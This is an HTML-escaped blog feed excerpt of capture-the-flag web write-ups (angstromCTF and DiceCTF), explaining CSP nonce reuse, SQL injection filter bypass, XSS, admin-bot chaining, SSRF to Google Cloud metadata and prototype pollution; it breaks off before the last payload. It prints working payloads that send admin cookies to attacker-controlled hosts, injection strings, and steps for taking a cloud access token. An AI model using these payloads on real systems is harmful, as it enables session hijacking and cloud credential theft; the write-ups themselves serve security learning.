&amp;lt;/form&amp;gt;
&amp;lt;script&amp;gt;
document.getElementById(&#39;hack&#39;).submit();
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&amp;quot;&amp;quot;&amp;quot;

@app.route(&#39;/flag&#39;)
def flag():
        return &amp;quot;&amp;quot;&amp;quot;
&amp;lt;html&amp;gt;
&amp;lt;meta name=&#39;referrer&#39; content=&#39;no-referrer&#39;&amp;gt; 
&amp;lt;body&amp;gt;
&amp;lt;script&amp;gt;
function load(data){
fetch(&amp;quot;http://SERVER?a=&amp;quot;+data.items.map(i =&amp;gt; i).join(&#39;&#39;));
}
var s=document.createElement(&amp;quot;script&amp;quot;);
s.src=&amp;quot;https://jason.2021.chall.actf.co/flags?callback=load&amp;quot;;
document.body.appendChild(s);
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

&amp;quot;&amp;quot;&amp;quot;

@app.route(&#39;/&#39;)
def index():
        return &amp;quot;&amp;quot;&amp;quot;
&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;img src=&amp;quot;/delay&amp;quot;/&amp;gt;
&amp;lt;script&amp;gt;
var w=window.open(&amp;quot;/form&amp;quot;,&amp;quot;win&amp;quot;);
window.open(&amp;quot;/flag&amp;quot;,&amp;quot;hah&amp;quot;);
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt; 
&amp;lt;/html&amp;gt;
&amp;quot;&amp;quot;&amp;quot;
if __name__==&amp;quot;__main__&amp;quot;:
        app.run(port=1234, host=&amp;quot;0.0.0.0&amp;quot;)


&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And bingo we get our flag :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/xnOHIJp.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Unfortunately I couldn&amp;rsquo;t try the last two challenges because of the lack of time ( school is the worst ) :&amp;rsquo;( I have really enjoyed the tasks especially the client side ones so kudos to the authors for these well designed challenges ! I hope you learned from the writeup , feel free to dm me on twitter if you have any questions!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>DiceCTF Web Writeups - Client Side Chaining And JS Attacks</title>
      <link>https://ahmed-belkahla.me/post/dice_ctf_web_writeups/</link>
      <pubDate>Wed, 10 Feb 2021 22:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/dice_ctf_web_writeups/</guid>
      <description>&lt;p&gt;Hello everybody , it has been a long time since I have posted a writeup :( I have been a little busy in the last period with school assignments, exams and some work (Covid has really messed up my life). After a little break I had fun participating in Dice CTF which had some great client side challenges, we will explore them in details in this article , we assume you have a background about basic client side attacks, so let&amp;rsquo;s start our ride now. (Challenges are still up, you can try them &lt;strong&gt;
&lt;a href=&#34;https://ctf.dicega.ng/challs&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt; or follow along with me)&lt;/p&gt;
&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
&lt;p&gt;1- Client Side chaining attacks&lt;/p&gt;
&lt;p&gt;2- Babier CSP&lt;/p&gt;
&lt;p&gt;3- Missing Flavortext&lt;/p&gt;
&lt;p&gt;4- Web Utils&lt;/p&gt;
&lt;p&gt;5- Build a Panel&lt;/p&gt;
&lt;p&gt;6- Web IDE&lt;/p&gt;
&lt;p&gt;7- Watermark as a Service&lt;/p&gt;
&lt;p&gt;8- Build a Better Panel&lt;/p&gt;
&lt;h2 id=&#34;client-side-chaining-attacks&#34;&gt;Client Side Chaining Attacks&lt;/h2&gt;
&lt;p&gt;Generally client side bugs alone have a low impact , but with the great research going on it&amp;rsquo;s possible to chain multiple bugs together and get a higher impact, a simple reflected XSS can now lead to account takeover if it&amp;rsquo;s chained with some other bugs. The last CTFs have been focusing on this techniques and DiceCTF was not an exception , it had great tasks that required chaining multiple bugs to get the flag.&lt;/p&gt;
&lt;h2 id=&#34;babier-csp&#34;&gt;Babier CSP&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/4p9Tvbc.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;The website is simple and has an obvious reflected XSS but it was protected with a strict CSP (Content Security Policy). Firstly I didn&amp;rsquo;t notice the source code that was provided with the task so I tried to find a way to bypass the CSP&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;default-src none; script-src &#39;nonce-g+ojjmb9xLfE+3j9PsP/Ig==&#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/sZpg1oc.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;In fact, if we focus a little bit you can see that none is not situated between two quotation marks so it will be interpreted as the hostname &amp;ldquo;none&amp;rdquo; , I played a little bit with this but i reached a dead end :&amp;rsquo;( Fortunately when I saw the source code it was obvious that the nonce is only generated once so we can reuse it.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const express = require(&#39;express&#39;);
const crypto = require(&amp;quot;crypto&amp;quot;);
const config = require(&amp;quot;./config.js&amp;quot;);
const app = express()
const port = process.env.port || 3000;

const SECRET = config.secret;
const NONCE = crypto.randomBytes(16).toString(&#39;base64&#39;);

const template = name =&amp;gt; `
&amp;lt;html&amp;gt;

${name === &#39;&#39; ? &#39;&#39;: `&amp;lt;h1&amp;gt;${name}&amp;lt;/h1&amp;gt;`}
&amp;lt;a href=&#39;#&#39; id=elem&amp;gt;View Fruit&amp;lt;/a&amp;gt;

&amp;lt;script nonce=${NONCE}&amp;gt;
elem.onclick = () =&amp;gt; {
  location = &amp;quot;/?name=&amp;quot; + encodeURIComponent([&amp;quot;apple&amp;quot;, &amp;quot;orange&amp;quot;, &amp;quot;pineapple&amp;quot;, &amp;quot;pear&amp;quot;][Math.floor(4 * Math.random())]);
}
&amp;lt;/script&amp;gt;

&amp;lt;/html&amp;gt;
`;

app.get(&#39;/&#39;, (req, res) =&amp;gt; {
  res.setHeader(&amp;quot;Content-Security-Policy&amp;quot;, `default-src none; script-src &#39;nonce-${NONCE}&#39;;`);
  res.send(template(req.query.name || &amp;quot;&amp;quot;));
})

app.use(&#39;/&#39; + SECRET, express.static(__dirname + &amp;quot;/secret&amp;quot;));

app.listen(port, () =&amp;gt; {
  console.log(`Example app listening at http://localhost:${port}`)
})
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So Our last payload that we will send to the admin bot is:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://babier-csp.dicec.tf/?name=%3Cscript%20nonce=%22LRGWAXOY98Es0zz0QOVmag==%22%3Edocument.location=%22https://fword.wtf/?a=%22%2Bdocument.cookie;%3C/script%3E
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;PS:&lt;/strong&gt; I used window.location because of default-src attribute in CSP so we can only use fetch for example with the hostname none.&lt;/p&gt;
&lt;h2 id=&#34;missing-flavortext&#34;&gt;Missing Flavortext&lt;/h2&gt;
&lt;p&gt;The website is a simple login page and we have the source code&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(&#39;static&#39;));

// login route
app.post(&#39;/login&#39;, (req, res) =&amp;gt; {
  if (!req.body.username || !req.body.password) {
    return res.redirect(&#39;/&#39;);
  }

  if ([req.body.username, req.body.password].some(v =&amp;gt; v.includes(&#39;\&#39;&#39;))) {
    return res.redirect(&#39;/&#39;);
  }

  // see if user is in database
  const query = `SELECT id FROM users WHERE
    username = &#39;${req.body.username}&#39; AND
    password = &#39;${req.body.password}&#39;
  `;

  let id;
  try { id = db.prepare(query).get()?.id } catch {
    return res.redirect(&#39;/&#39;);
  }

  // correct login
  if (id) return res.sendFile(&#39;flag.html&#39;, { root: __dirname });

  // incorrect login
  return res.redirect(&#39;/&#39;);
});

app.listen(3000);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can easily notice the sql injection in this piece of code&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  const query = `SELECT id FROM users WHERE
    username = &#39;${req.body.username}&#39; AND
    password = &#39;${req.body.password}&#39;
  `;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;But there is a simple filter that is blacklisting the quotation mark:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  if ([req.body.username, req.body.password].some(v =&amp;gt; v.includes(&#39;\&#39;&#39;))) {
    return res.redirect(&#39;/&#39;);
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s focus on bypassing the filter , I encountered this type of check algorithms a lot in previous CTFs so after seeing &lt;code&gt; app.use(bodyParser.urlencoded({ extended: true }));&lt;/code&gt; I knew that we will try to use arrays to trick the filter. When the extended attribute of bodyparser is set to True we can use any type in the request parameters (When it&amp;rsquo;s set to false we can only use strings or arrays). &amp;ldquo;Includes&amp;rdquo; function can be used for arrays and strings so if we pass the password as an array we will be able to bypass the filter. (I covered this technique in more details in the following &lt;strong&gt;
&lt;a href=&#34;https://ahmed-belkahla.me/post/angstromctf20/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;writeup&lt;/a&gt;&lt;/strong&gt;) . Finally running the following command we will get our flag:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -d &amp;quot;username=admin&amp;amp;password[]=&#39;or 1=1 -- -&amp;quot; https://missing-flavortext.dicec.tf/login
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/vjRONbL.png&#34; alt=&#34;FLAG&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;web-utils&#34;&gt;Web Utils&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/U8ZpCk8.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;We have a website that have link sortener and pastebin functionalities, our goal is to steal the admin cookies so the first thing I thinked about is finding an XSS.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/qsD2mmS.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;After exploring the existing fields in the website there was no obvious XSS, while I was exploring the source code I had the idea to try shortening a url of the following form &lt;code&gt;javascript:alert(1);&lt;/code&gt; but there was a regex expression filtering the url format.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;module.exports = async (fastify) =&amp;gt; {
  fastify.post(&#39;createLink&#39;, {
    handler: (req, rep) =&amp;gt; {
      const uid = database.generateUid(8);
      const regex = new RegExp(&#39;^https?://&#39;);
      if (! regex.test(req.body.data))
        return rep
          .code(200)
          .header(&#39;Content-Type&#39;, &#39;application/json; charset=utf-8&#39;)
          .send({
            statusCode: 200,
            error: &#39;Invalid URL&#39;
          });
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;But focusing more on the source code we can notice this piece of code in the CreatePaste endpoint :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  fastify.post(&#39;createPaste&#39;, {
    handler: (req, rep) =&amp;gt; {
      const uid = database.generateUid(8);
      database.addData({ type: &#39;paste&#39;, ...req.body, uid });
      rep
        .code(200)
        .header(&#39;Content-Type&#39;, &#39;application/json; charset=utf-8&#39;)
        .send({
          statusCode: 200,
          data: uid
        });
    },
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The following line is pretty juicy&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;database.addData({ type: &#39;paste&#39;, ...req.body, uid });
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Any parameter we will send in the request&amp;rsquo;s body will be passed to the addData function so we can change the type of the added data to &amp;ldquo;link&amp;rdquo; and get rid of the regex expression in the CreateLink endpoint, so the payload will be :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl --header &amp;quot;Content-Type: application/json&amp;quot; \
  --request POST \
  --data &#39;{&amp;quot;type&amp;quot;:&amp;quot;link&amp;quot;,&amp;quot;data&amp;quot;:&amp;quot;javascript:fetch(\&amp;quot;https://&amp;lt;Domain&amp;gt;?a=\&amp;quot;+document.cookie);&amp;quot;}&#39; https://web-utils.dicec.tf/api/createPaste
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/SM1F62T.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;After that we send the paste link &lt;code&gt;https://web-utils.dicec.tf/view/HW9BHr0a&lt;/code&gt; to the admin bot  and we get the cookie in our controlled web server (You can use webhook.site for example).&lt;/p&gt;
&lt;h2 id=&#34;build-a-panel&#34;&gt;Build a Panel&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Fwqh7PY.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;The website is simple , you can create a panel and add some widgets in it . After analysing the provided source code we can notice that the flag is in the database.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;db.run(query);
query = `CREATE TABLE IF NOT EXISTS flag (
    flag TEXT
)`;
db.run(query, [], (err) =&amp;gt; {
    if(!err){
        let innerQuery = `INSERT INTO flag SELECT &#39;dice{fake_flag}&#39;`;
        db.run(innerQuery);
    }else{
        console.error(&#39;Could not create flag table&#39;);
    }
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The following piece code looks interesting , we can see the SQL injection vulnerability but unfortunately this endpoint is only accessible by the admin&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;app.get(&#39;/admin/debug/add_widget&#39;, async (req, res) =&amp;gt; {
    const cookies = req.cookies;
    const queryParams = req.query;

    if(cookies[&#39;token&#39;] &amp;amp;&amp;amp; cookies[&#39;token&#39;] == secret_token){
        query = `INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (&#39;${queryParams[&#39;panelid&#39;]}&#39;, &#39;${queryParams[&#39;widgetname&#39;]}&#39;, &#39;${queryParams[&#39;widgetdata&#39;]}&#39;);`;
        db.run(query, (err) =&amp;gt; {
            if(err){
                console.log(err);
                res.send(&#39;something went wrong&#39;);
            }else{
                res.send(&#39;success!&#39;);
            }
        });
    }else{
        res.redirect(&#39;/&#39;);
    }
});

app.listen(31337, () =&amp;gt; {
    console.log(&#39;express listening on 31337&#39;)
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So what if we send the link having our SQL injection payload to the admin so it will be executed as the admin and we can bypass the following check&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;if(cookies[&#39;token&#39;] &amp;amp;&amp;amp; cookies[&#39;token&#39;] == secret_token)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;For the SQL injection part we will use the subqueries to create a widget in our panel with a title having the flag , our final payload that we will send to the admin bot is :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=&amp;lt;Your-Panel-ID&amp;gt;&#39;, (select flag from flag limit 1), &#39;1&#39;);--&amp;amp;widgetname=a&amp;amp;widgetdata=a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And Bingo our beloved flag is there :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/c51VGbR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;web-ide&#34;&gt;Web IDE&lt;/h2&gt;
&lt;p&gt;The website is a simple IDE to run javascript code in a sandboxed environment, we have the source code as usual .&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/z5jCnly.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;After analysing the code we can notice that the flag is in the admin cookie so obviously our goal will be to steal it&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  case &#39;admin&#39;:
    if (password === adminPassword)
      return res.cookie(&#39;token&#39;, `dice{${process.env.FLAG}}`, {
        path: &#39;/ide&#39;,
        sameSite: &#39;none&#39;,
        secure: true
      }).redirect(&#39;/ide/&#39;);
    break;
  }
  res.status(401).end();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The restrictions that are set up are the following:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;app.use(&#39;/&#39;, (req, res, next) =&amp;gt; {
  res.setHeader(&#39;X-Frame-Options&#39;, &#39;DENY&#39;);
  return next();
});
// sandbox the sandbox
app.use(&#39;/sandbox.html&#39;, (req, res, next) =&amp;gt; {
  res.setHeader(&#39;Content-Security-Policy&#39;, &#39;frame-src \&#39;none\&#39;&#39;);
  // we have to allow this for obvious reasons
  res.removeHeader(&#39;X-Frame-Options&#39;);
  return next();
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I tried to think about a possible scenario in order to achieve xss, the first thing was to try to bypass the sandbox so let&amp;rsquo;s take a look at its code in sandbox.js:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  const safeEval = (d) =&amp;gt; (function (data) {
    with (new Proxy(window, {
      get: (t, p) =&amp;gt; {
        if (p === &#39;console&#39;) return { log };
        if (p === &#39;eval&#39;) return window.eval;
        return undefined;
      }
    })) {
      eval(data);
    }
  }).call(Object.create(null), d);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The page is listening for a postmessage , once received it execute safeEval function that is acting as a proxy, we can see that entering eval will return window.eval so what about using &lt;strong&gt;eval&amp;rsquo;s constructor&lt;/strong&gt; to execute our js code freely: &lt;code&gt;eval.constructor(&amp;quot;console.log(1);&amp;quot;)()&lt;/code&gt; will print 1 in the console so our code is executed. We need now to get the cookie from /ide path since the admin cookie&amp;rsquo;s path is set like the following&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{
      path: &#39;/ide&#39;,
      sameSite: &#39;none&#39;,
      secure: true
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;For this i used window.open in order to open 
&lt;a href=&#34;https://web-ide.dicec.tf/ide/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://web-ide.dicec.tf/ide/&lt;/a&gt; and access the dom from the window reference , this is only possible because we are not violating the same origin policy and opening the window from the same origin .
Let&amp;rsquo;s wrap the things up now, we will create a webpage that when the admin visits it, we will send a postmessage to the sandbox ( that&amp;rsquo;s why you have to check the origin when you are using postmessages ) and open a window of 
&lt;a href=&#34;https://web-ide.dicec.tf/ide/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://web-ide.dicec.tf/ide/&lt;/a&gt; and send the cookie to our controlled website. The final payload code :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;PoC&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;iframe id=&amp;quot;vuln&amp;quot; src=&amp;quot;https://web-ide.dicec.tf/sandbox.html&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&amp;lt;script&amp;gt;
setTimeout(
()=&amp;gt;{document.getElementById(&amp;quot;vuln&amp;quot;).contentWindow.postMessage(&amp;quot;eval.constructor(\&amp;quot;var w=window.open(&#39;https://web-ide.dicec.tf/ide/&#39;);setTimeout(()=&amp;gt;{window.location=&#39;https://&amp;lt;Your-Domain&amp;gt;?a=&#39;+btoa(w.document.cookie);},2000);\&amp;quot;)();&amp;quot;,&amp;quot;*&amp;quot;)}
,2000);
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We only have to host this page on our server and send the link to the admin bot . This was an unintended solution , the intended one is abusing service workers and navigator.sendBeacon in order to steal the cookie , you can check more details &lt;strong&gt;
&lt;a href=&#34;https://discord.com/channels/805956008665022475/808122408019165204/808143656946368512&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt; .&lt;/p&gt;
&lt;p&gt;I enjoyed this task the most and it required me some time that&amp;rsquo;s why i solved it after the end of the CTF but still learned a lot from it.&lt;/p&gt;
&lt;h2 id=&#34;watermark-as-a-service&#34;&gt;Watermark as a Service&lt;/h2&gt;
&lt;p&gt;Unfortunately, I didn&amp;rsquo;t have the chance to take a look at this task while the CTF was running but it was a fun easy task. We have a website that visits the link we enter and takes a screenshot of the website.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/Qo6chyi.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Most of you are thinking now of SSRF attack but there are some strict filters restricting us from using usual payloads and DNS rebinding tricks.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  let urlObj;
  try {
    urlObj = new URL(url);
  } catch {
    res.sendStatus(400);
    return;
  }

  const hostname = urlObj?.hostname;

  if (!hostname || ip.isPrivate(hostname)) {
    res.sendStatus(400);
    return;
  }

  if (BLOCKED_HOSTS.some((blockedHost) =&amp;gt; hostname.includes(blockedHost))) {
    res.sendStatus(400);
    return;
  }

  const protocol = urlObj?.protocol;
  if (
    !protocol ||
    !ALLOWED_PROTOCOLS.some((allowedProtocol) =&amp;gt;
      protocol.includes(allowedProtocol)
    )
  ) {
    res.sendStatus(400);
    return;
  }

  let addresses
  try {
    addresses = await resolve4(hostname);
  } catch {
    res.sendStatus(400);
    return;
  }

  if (addresses.includes(&amp;quot;169.254.169.254&amp;quot;)) {
    res.sendStatus(400);
    return;
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Our goal is to access google cloud metadata in order to get the access token and explore their cloud infrastructure .
Analysing the source code, we can figure that the website is using puppeteer which is a headless chrome browser so we can host a normal static page that has a simple &lt;code&gt;js window.location=&amp;quot;http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&amp;quot;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;tbh I didn&amp;rsquo;t try this solution, I have just developed a simple webapp that returns a 302 status code redirect to Google Cloud internal metadata, this is the source code:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
header(&#39;Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&#39;, true, 301);
exit;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I like tasks that don&amp;rsquo;t need a lot of code xD You can also simply use an url shortener like cuttly or bit.ly. We have the following result after redirecting it to ``
&lt;a href=&#34;http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true%60%60%60&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true```&lt;/a&gt;.
Notice that we are using the beta service of metadata endpoint because it doesn&amp;rsquo;t require any additional headers to setup.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/jVhKZIM.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;If you focus on the results there is a docker image in &lt;code&gt;https://gcr.io/dicegang-waas/waas&lt;/code&gt; so let&amp;rsquo;s grab the google cloud access token and try to run the docker image , we will redirect it to the following url now&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Bingo we have the access token now&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/FcF5jWo.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;I was really a little bit lazy to use an ocr tool and copy the access token from the screenshot x) All you have to do now is to run the following commands (
&lt;a href=&#34;https://cloud.google.com/container-registry/docs/advanced-authentication?hl=fr#token&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Ref&lt;/a&gt;):&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;docker login -u oauth2accesstoken -p &amp;quot;&amp;lt;Access-Token&amp;gt;&amp;quot; https://gcr.io/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Then&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;docker pull gcr.io/dicegang-waas/waas
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And finally running the image will give you the flag&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;docker run -it gcr.io/dicegang-waas/waas
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Fun Fact:&lt;/strong&gt; We used a similar technique to break into a previous CTF infrastructure, if you are eager to know more you can read this &lt;strong&gt;
&lt;a href=&#34;https://twitter.com/FwordTeam/status/1340988591787401216&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;tweet&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;build-a-better-panel&#34;&gt;Build a Better Panel&lt;/h2&gt;
&lt;p&gt;This task was the same as Build a Panel but the admin bot was restricted to visit only the websites matching this regex &lt;code&gt;^https:\/\/build-a-better-panel\.dicec\.tf\/create\?[0-9a-z\-\=]+$&lt;/code&gt; so we can&amp;rsquo;t send directly the url having the SQL injection payload, we need to find a client side bug and chain it in order to achieve our goal.
I started exploring the client side code and the following snippet seemed suspicious:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const mergableTypes = [&#39;boolean&#39;, &#39;string&#39;, &#39;number&#39;, &#39;bigint&#39;, &#39;symbol&#39;, &#39;undefined&#39;];

const safeDeepMerge = (target, source) =&amp;gt; {
    for (const key in source) {
        if(!mergableTypes.includes(typeof source[key]) &amp;amp;&amp;amp; !mergableTypes.includes(typeof target[key])){
            if(key !== &#39;__proto__&#39;){
                safeDeepMerge(target[key], source[key]);
            }
        }else{
            target[key] = source[key];
        }
    }
}

const displayWidgets = async () =&amp;gt; {
    const userWidgets = await (await fetch(&#39;/panel/widgets&#39;, {method: &#39;post&#39;, credentials: &#39;same-origin&#39;})).json();
    let toDisplayWidgets = {&#39;welcome back to build a panel!&#39;: {&#39;type&#39;: &#39;welcome&#39;}};

    safeDeepMerge(toDisplayWidgets, userWidgets);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;There is an obvious prototype pollution vulnerability but we need to bypass the filter of &amp;ldquo;__proto__&amp;rdquo; , fortunately we are talking about javascript here where everything is possible :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/y74Mw1v.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;a.__proto__&lt;/strong&gt; is similar to &lt;strong&gt;a.constructor.prototype&lt;/strong&gt; (a is a JS object) , userWidgets is fetched from &lt;strong&gt;/panel/widgets&lt;/strong&gt; and we can control the data passed to an object. Let&amp;rsquo;s check the part responsible of returning the widgets in the backend&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;app.post(&#39;/panel/widgets&#39;, (req, res) =&amp;gt; {
    const cookies = req.cookies;

    if(cookies[&#39;panelId&#39;]){
        const panelId = cookies[&#39;panelId&#39;];

        query = `SELECT widgetname, widgetdata FROM widgets WHERE panelid = ?`;
        db.all(query, [panelId], (err, rows) =&amp;gt; {
            if(!err){
                let panelWidgets = {};
                for(let row of rows){
                    try{
                        panelWidgets[row[&#39;widgetname&#39;]] = JSON.parse(row[&#39;widgetdata&#39;]);
                    }catch{
                        
                    }
                }
                res.json(panelWidgets);
            }else{
                res.send(&#39;something went wrong&#39;);
            }
        });
    }
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The following line is the most juicy:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;panelWidgets[row[&#39;widgetname&#39;]] = JSON.parse(row[&#39;widgetdata&#39;]);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This screenshot can resume what will happen:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/4jQJ5SI.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now we have to figure out what to do with the prototype pollution and use it to achieve an XSS or somehow send a request to the endpoint vulnerable to SQL Injection (XSS is pretty hard because there is a strict CSP). After searching a little bit I found the following 
&lt;a href=&#34;https://github.com/BlackFan/client-side-prototype-pollution&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;github repo&lt;/a&gt; holding several gadgets to use. The website is using embedly and I found the following gadget to achieve XSS ( &lt;strong&gt;
&lt;a href=&#34;https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/embedly.md&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Gadget&lt;/a&gt;&lt;/strong&gt; ) but as we said with the used CSP it&amp;rsquo;s nearly impossible to execute JS code .&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;default-src &#39;none&#39;; script-src &#39;self&#39; http://cdn.embedly.com/; style-src &#39;self&#39; http://cdn.embedly.com/; connect-src &#39;self&#39; https://www.reddit.com/comments/;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After the end of the CTF I discovered from the discord server of the CTF that there was another gadget permitting us to set any attribute of an iframe , so we can set the srcdoc attribute to redirect the admin to the endpoint vulnerable to SQL injection, our final payload that we will send to create a widget is :&lt;/p&gt;
